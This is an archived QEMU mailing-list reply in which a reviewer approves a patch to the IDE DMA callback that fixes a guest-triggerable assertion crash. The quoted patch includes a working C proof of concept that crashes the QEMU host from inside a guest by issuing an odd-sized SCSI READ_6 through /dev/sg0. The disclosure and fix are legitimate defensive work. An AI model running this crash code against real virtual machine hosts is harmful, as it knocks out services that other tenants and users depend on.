Return-Path: <SRS0=pQgJ=ZH=nongnu.org=qemu-devel-bounces+qemu-devel=archiver.kernel.org@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
X-Spam-Level: 
X-Spam-Status: No, score=-8.0 required=3.0 tests=DKIM_INVALID,DKIM_SIGNED,
	HEADER_FROM_DIFFERENT_DOMAINS,INCLUDES_PATCH,MAILING_LIST_MULTI,SIGNED_OFF_BY,
	SPF_HELO_NONE,SPF_PASS,UNPARSEABLE_RELAY,URIBL_BLOCKED,USER_AGENT_SANE_1
	autolearn=ham autolearn_force=no version=3.4.0
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 595BDC432C3
	for <qemu-devel@archiver.kernel.org>; Fri, 15 Nov 2019 11:11:10 +0000 (UTC)
Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by mail.kernel.org (Postfix) with ESMTPS id 24813206C0
	for <qemu-devel@archiver.kernel.org>; Fri, 15 Nov 2019 11:11:10 +0000 (UTC)
Authentication-Results: mail.kernel.org;
	dkim=fail reason="signature verification failed" (2048-bit key) header.d=oracle.com header.i=@oracle.com header.b="R8OlMvx9"
DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 24813206C0
Authentication-Results: mail.kernel.org; dmarc=fail (p=none dis=none) header.from=oracle.com
Authentication-Results: mail.kernel.org; spf=pass smtp.mailfrom=qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Received: from localhost ([::1]:37796 helo=lists1p.gnu.org)
	by lists.gnu.org with esmtp (Exim 4.90_1)
	(envelope-from <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>)
	id 1iVZVN-0007NJ-9G
	for qemu-devel@archiver.kernel.org; Fri, 15 Nov 2019 06:11:09 -0500
Received: from eggs.gnu.org ([2001:470:142:3::10]:35167)
 by lists.gnu.org with esmtp (Exim 4.90_1)
 (envelope-from <darren.kenny@oracle.com>) id 1iVZTz-00064c-Rq
 for qemu-devel@nongnu.org; Fri, 15 Nov 2019 06:09:45 -0500
Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
 (envelope-from <darren.kenny@oracle.com>) id 1iVZTw-0004ex-4S
 for qemu-devel@nongnu.org; Fri, 15 Nov 2019 06:09:41 -0500
Received: from aserp2120.oracle.com ([141.146.126.78]:37294)
 by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_256_CBC_SHA1:32)
 (Exim 4.71) (envelope-from <darren.kenny@oracle.com>)
 id 1iVZTt-0004X9-Li; Fri, 15 Nov 2019 06:09:38 -0500
Received: from pps.filterd (aserp2120.oracle.com [127.0.0.1])
 by aserp2120.oracle.com (8.16.0.27/8.16.0.27) with SMTP id xAFB4NW1077914;
 Fri, 15 Nov 2019 11:09:25 GMT
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com;
 h=date : from : to : cc
 : subject : message-id : references : mime-version : content-type :
 in-reply-to; s=corp-2019-08-05;
 bh=00EBOHwLc+0AC6VOWuUUTOH7lI4bpGhThJRYesrJDCo=;
 b=R8OlMvx90E+IctrFWBmsvqfeWVpBe51QEf5R1sAFNjNnR09wuNd3rui9RNed9LSkcv/X
 q24J1apuvvnvq9TXl9ARUtQKxSN2u5tY7vgiiSwonYwFgTzO2O5DvlPKA0JBXm88F6k2
 51ozxm+0AqVz6eYScP/Cg042AFPIDmMldTy3/PQ+e5WBELT7V59bwgfTgwlUQrdPa+AQ
 y6da9zE4GE2kduiu2cdae8/SVnRmnfgAxqycOw3rlpN/8NLomEOg7StWqMYR4vAupqqq
 DerjH7t644nXbzl65ZcU5lp6PDAZ8mU+qREUqZ6A6oZZMmKnIxCEpGOgyrDUDoAP1orc ww== 
Received: from aserp3020.oracle.com (aserp3020.oracle.com [141.146.126.70])
 by aserp2120.oracle.com with ESMTP id 2w9gxpjm89-1
 (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
 Fri, 15 Nov 2019 11:09:24 +0000
Received: from pps.filterd (aserp3020.oracle.com [127.0.0.1])
 by aserp3020.oracle.com (8.16.0.27/8.16.0.27) with SMTP id xAFB8XuV087665;
 Fri, 15 Nov 2019 11:09:24 GMT
Received: from aserv0121.oracle.com (aserv0121.oracle.com [141.146.126.235])
 by aserp3020.oracle.com with ESMTP id 2w9h0kc1ed-1
 (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
 Fri, 15 Nov 2019 11:09:24 +0000
Received: from abhmp0001.oracle.com (abhmp0001.oracle.com [141.146.116.7])
 by aserv0121.oracle.com (8.14.4/8.13.8) with ESMTP id xAFB9NaF001941;
 Fri, 15 Nov 2019 11:09:23 GMT
Received: from starbug-mbp.localdomain (/10.175.204.77)
 by default (Oracle Beehive Gateway v4.0)
 with ESMTP ; Fri, 15 Nov 2019 03:09:23 -0800
Received: from starbug-mbp (localhost [127.0.0.1])
 by starbug-mbp.localdomain (Postfix) with SMTP id B11AF4C2A7C0;
 Fri, 15 Nov 2019 11:09:18 +0000 (GMT)
Date: Fri, 15 Nov 2019 11:09:18 +0000
From: Darren Kenny <darren.kenny@oracle.com>
To: Alexander Popov <alex.popov@linux.com>
Subject: Re: [PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to
 prevent qemu DoS from quests
Message-ID: <20191115110918.aix6wuvvsgpokvsz@starbug-mbp>
Mail-Followup-To: Alexander Popov <alex.popov@linux.com>,
 "Michael S . Tsirkin" <mst@redhat.com>,
 John Snow <jsnow@redhat.com>, qemu-block@nongnu.org,
 qemu-devel@nongnu.org, qemu-stable@nongnu.org, pmatouse@redhat.com,
 sstabellini@kernel.org, mdroth@linux.vnet.ibm.com, pjp@redhat.com,
 Paolo Bonzini <pbonzini@redhat.com>,
 Andrea Arcangeli <aarcange@redhat.com>,
 Kashyap Chamarthy <kashyap.cv@gmail.com>
References: <20191114172531.10644-1-alex.popov@linux.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Disposition: inline
In-Reply-To: <20191114172531.10644-1-alex.popov@linux.com>
User-Agent: NeoMutt/20180716
X-Proofpoint-Virus-Version: vendor=nai engine=6000 definitions=9441
 signatures=668685
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=2
 malwarescore=0
 phishscore=0 bulkscore=0 spamscore=0 mlxscore=0 mlxlogscore=999
 adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1911140001 definitions=main-1911150105
X-Proofpoint-Virus-Version: vendor=nai engine=6000 definitions=9441
 signatures=668685
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0
 priorityscore=1501 malwarescore=0
 suspectscore=2 phishscore=0 bulkscore=0 spamscore=0 clxscore=1011
 lowpriorityscore=0 mlxscore=0 impostorscore=0 mlxlogscore=999 adultscore=0
 classifier=spam adjust=0 reason=mlx scancount=1 engine=8.0.1-1911140001
 definitions=main-1911150105
X-detected-operating-system: by eggs.gnu.org: GNU/Linux 3.x [generic] [fuzzy]
X-Received-From: 141.146.126.78
X-BeenThere: qemu-devel@nongnu.org
X-Mailman-Version: 2.1.23
Precedence: list
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <https://lists.nongnu.org/archive/html/qemu-devel>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
Cc: Andrea Arcangeli <aarcange@redhat.com>, sstabellini@kernel.org,
 pmatouse@redhat.com, mdroth@linux.vnet.ibm.com, qemu-block@nongnu.org,
 "Michael S . Tsirkin" <mst@redhat.com>, qemu-stable@nongnu.org,
 qemu-devel@nongnu.org, Kashyap Chamarthy <kashyap.cv@gmail.com>,
 Paolo Bonzini <pbonzini@redhat.com>, John Snow <jsnow@redhat.com>,
 pjp@redhat.com
Errors-To: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Sender: "Qemu-devel"
 <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>

On Thu, Nov 14, 2019 at 08:25:31PM +0300, Alexander Popov wrote:
>The commit a718978ed58a from July 2015 introduced the assertion which
>implies that the size of successful DMA transfers handled in ide_dma_cb()
>should be multiple of 512 (the size of a sector). But guest systems can
>initiate DMA transfers that don't fit this requirement.
>
>PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
>command and crash qemu:
>
>#include <stdio.h>
>#include <sys/ioctl.h>
>#include <stdint.h>
>#include <sys/types.h>
>#include <sys/stat.h>
>#include <fcntl.h>
>#include <string.h>
>#include <stdlib.h>
>#include <scsi/scsi.h>
>#include <scsi/scsi_ioctl.h>
>
>#define CMD_SIZE 2048
>
>struct scsi_ioctl_cmd_6 {
>	unsigned int inlen;
>	unsigned int outlen;
>	unsigned char cmd[6];
>	unsigned char data[];
>};
>
>int main(void)
>{
>	intptr_t fd = 0;
>	struct scsi_ioctl_cmd_6 *cmd = NULL;
>
>	cmd = malloc(CMD_SIZE);
>	if (!cmd) {
>		perror("[-] malloc");
>		return 1;
>	}
>
>	memset(cmd, 0, CMD_SIZE);
>	cmd->inlen = 1337;
>	cmd->cmd[0] = READ_6;
>
>	fd = open("/dev/sg0", O_RDONLY);
>	if (fd == -1) {
>		perror("[-] opening sg");
>		return 1;
>	}
>
>	printf("[+] sg0 is opened\n");
>
>	printf("[.] qemu should break here:\n");
>	fflush(stdout);
>	ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
>	printf("[-] qemu didn't break\n");
>
>	free(cmd);
>
>	return 1;
>}
>
>For fixing that let's check the number of bytes prepared for the transfer
>by the prepare_buf() handler. If it is not a multiple of 512 then end
>the DMA transfer with an error.
>
>That also fixes the I/O stall in guests after a DMA transfer request
>for less than the size of a sector.
>
>Signed-off-by: Alexander Popov <alex.popov@linux.com>

Reviewed-by: Darren Kenny <darren.kenny@oracle.com>

Thanks,

Darren.

>---
> hw/ide/core.c | 11 +++++------
> 1 file changed, 5 insertions(+), 6 deletions(-)
>
>diff --git a/hw/ide/core.c b/hw/ide/core.c
>index 754ff4dc34..85aac614f0 100644
>--- a/hw/ide/core.c
>+++ b/hw/ide/core.c
>@@ -849,6 +849,7 @@ static void ide_dma_cb(void *opaque, int ret)
>     int64_t sector_num;
>     uint64_t offset;
>     bool stay_active = false;
>+    int32_t prepared = 0;
>
>     if (ret == -EINVAL) {
>         ide_dma_error(s);
>@@ -892,12 +893,10 @@ static void ide_dma_cb(void *opaque, int ret)
>     n = s->nsector;
>     s->io_buffer_index = 0;
>     s->io_buffer_size = n * 512;
>-    if (s->bus->dma->ops->prepare_buf(s->bus->dma, s->io_buffer_size) < 512) {
>-        /* The PRDs were too short. Reset the Active bit, but don't raise an
>-         * interrupt. */
>-        s->status = READY_STAT | SEEK_STAT;
>-        dma_buf_commit(s, 0);
>-        goto eot;
>+    prepared = s->bus->dma->ops->prepare_buf(s->bus->dma, s->io_buffer_size);
>+    if (prepared % 512) {
>+        ide_dma_error(s);
>+        return;
>     }
>
>     trace_ide_dma_cb(s, sector_num, n, IDE_DMA_CMD_str(s->dma_cmd));
>-- 
>2.21.0
>
>

